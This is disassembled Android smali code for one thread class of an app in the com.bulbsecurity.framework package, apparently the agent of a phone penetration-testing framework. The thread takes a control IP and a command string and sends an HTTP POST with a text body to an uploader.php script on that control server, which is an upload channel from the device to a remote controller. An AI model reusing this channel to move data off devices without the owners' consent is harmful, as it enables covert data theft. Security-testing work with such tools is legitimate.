.class Lcom/bulbsecurity/framework/app/WebUploadService3$1;
.super Ljava/lang/Thread;
.source "WebUploadService3.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/bulbsecurity/framework/app/WebUploadService3;->onStart(Landroid/content/Intent;I)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/bulbsecurity/framework/app/WebUploadService3;

.field final synthetic val$controlIP:Ljava/lang/String;

.field final synthetic val$uploadstring:Ljava/lang/String;


# direct methods
.method constructor <init>(Lcom/bulbsecurity/framework/app/WebUploadService3;Ljava/lang/String;Ljava/lang/String;)V
    .locals 0
    .param p1, "this$0"    # Lcom/bulbsecurity/framework/app/WebUploadService3;

    .prologue
    .line 34
    iput-object p1, p0, Lcom/bulbsecurity/framework/app/WebUploadService3$1;->this$0:Lcom/bulbsecurity/framework/app/WebUploadService3;

    iput-object p2, p0, Lcom/bulbsecurity/framework/app/WebUploadService3$1;->val$uploadstring:Ljava/lang/String;

    iput-object p3, p0, Lcom/bulbsecurity/framework/app/WebUploadService3$1;->val$controlIP:Ljava/lang/String;

    invoke-direct {p0}, Ljava/lang/Thread;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 22

    .prologue
    .line 37
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/bulbsecurity/framework/app/WebUploadService3$1;->val$uploadstring:Ljava/lang/String;

    move-object/from16 v20, v0

    const-string v21, " "

    invoke-virtual/range {v20 .. v21}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v3

    .line 38
    .local v3, "aString":[Ljava/lang/String;
    const/16 v20, 0x1

    aget-object v11, v3, v20

    .line 39
    .local v11, "port":Ljava/lang/String;
    const/16 v20, 0x0

    aget-object v4, v3, v20

    .line 40
    .local v4, "controlpath":Ljava/lang/String;
    const-string v17, "---"

    .line 41
    .local v17, "uploadbody":Ljava/lang/String;
    array-length v0, v3

    move/from16 v20, v0

    const/16 v21, 0x2

    move/from16 v0, v20

    move/from16 v1, v21

    if-le v0, v1, :cond_0

    .line 43
    const/16 v20, 0x2

    aget-object v17, v3, v20

    .line 45
    const/4 v9, 0x3

    .local v9, "j":I
    :goto_0
    array-length v0, v3

    move/from16 v20, v0

    move/from16 v0, v20

    if-ge v9, v0, :cond_0

    .line 47
    new-instance v20, Ljava/lang/StringBuilder;

    invoke-direct/range {v20 .. v20}, Ljava/lang/StringBuilder;-><init>()V

    move-object/from16 v0, v20

    move-object/from16 v1, v17

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v20

    const-string v21, " "

    invoke-virtual/range {v20 .. v21}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v20

    invoke-virtual/range {v20 .. v20}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v17

    .line 48
    new-instance v20, Ljava/lang/StringBuilder;

    invoke-direct/range {v20 .. v20}, Ljava/lang/StringBuilder;-><init>()V

    move-object/from16 v0, v20

    move-object/from16 v1, v17

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v20

    aget-object v21, v3, v9

    invoke-virtual/range {v20 .. v21}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v20

    invoke-virtual/range {v20 .. v20}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v17

    .line 45
    add-int/lit8 v9, v9, 0x1

    goto :goto_0

    .line 54
    .end local v9    # "j":I
    :cond_0
    new-instance v10, Ljava/util/ArrayList;

    invoke-direct {v10}, Ljava/util/ArrayList;-><init>()V

    .line 55
    .local v10, "nameValuePairs":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Lorg/apache/http/NameValuePair;>;"
    new-instance v20, Lorg/apache/http/message/BasicNameValuePair;

    const-string v21, "text"

    move-object/from16 v0, v20

    move-object/from16 v1, v21

    move-object/from16 v2, v17

    invoke-direct {v0, v1, v2}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    move-object/from16 v0, v20

    invoke-virtual {v10, v0}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 57
    :try_start_0
    new-instance v7, Lorg/apache/http/impl/client/DefaultHttpClient;

    invoke-direct {v7}, Lorg/apache/http/impl/client/DefaultHttpClient;-><init>()V

    .line 58
    .local v7, "httpclient":Lorg/apache/http/client/HttpClient;
    const-string v6, "http://"

    .line 59
    .local v6, "http":Ljava/lang/String;
    const-string v16, "/"

    .line 60
    .local v16, "slash":Ljava/lang/String;
    const-string v19, "uploader.php"

    .line 61
    .local v19, "url":Ljava/lang/String;
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/bulbsecurity/framework/app/WebUploadService3$1;->val$controlIP:Ljava/lang/String;

    move-object/from16 v20, v0

    move-object/from16 v0, v20

    invoke-virtual {v6, v0}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v18

    .line 62
    .local v18, "uri":Ljava/lang/String;
    move-object/from16 v0, v18

    invoke-virtual {v0, v4}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    .line 63
    .local v13, "postto1":Ljava/lang/String;
    move-object/from16 v0, v16

    invoke-virtual {v13, v0}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v14

    .line 64
    .local v14, "posty":Ljava/lang/String;
    invoke-virtual {v14, v11}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v15

    .line 65
    .local v15, "posty2":Ljava/lang/String;
    move-object/from16 v0, v19

    invoke-virtual {v15, v0}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    .line 66
    .local v12, "postto":Ljava/lang/String;
    new-instance v8, Lorg/apache/http/client/methods/HttpPost;

    invoke-direct {v8, v12}, Lorg/apache/http/client/methods/HttpPost;-><init>(Ljava/lang/String;)V

    .line 67
    .local v8, "httppost":Lorg/apache/http/client/methods/HttpPost;
    new-instance v20, Lorg/apache/http/client/entity/UrlEncodedFormEntity;

    move-object/from16 v0, v20

    invoke-direct {v0, v10}, Lorg/apache/http/client/entity/UrlEncodedFormEntity;-><init>(Ljava/util/List;)V

    move-object/from16 v0, v20

    invoke-virtual {v8, v0}, Lorg/apache/http/client/methods/HttpPost;->setEntity(Lorg/apache/http/HttpEntity;)V

    .line 68
    invoke-interface {v7, v8}, Lorg/apache/http/client/HttpClient;->execute(Lorg/apache/http/client/methods/HttpUriRequest;)Lorg/apache/http/HttpResponse;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 76
    .end local v6    # "http":Ljava/lang/String;
    .end local v7    # "httpclient":Lorg/apache/http/client/HttpClient;
    .end local v8    # "httppost":Lorg/apache/http/client/methods/HttpPost;
    .end local v12    # "postto":Ljava/lang/String;
    .end local v13    # "postto1":Ljava/lang/String;
    .end local v14    # "posty":Ljava/lang/String;
    .end local v15    # "posty2":Ljava/lang/String;
    .end local v16    # "slash":Ljava/lang/String;
    .end local v18    # "uri":Ljava/lang/String;
    .end local v19    # "url":Ljava/lang/String;
    :goto_1
    return-void

    .line 71
    :catch_0
    move-exception v5

    .line 73
    .local v5, "e":Ljava/lang/Exception;
    invoke-virtual {v5}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_1
.end method
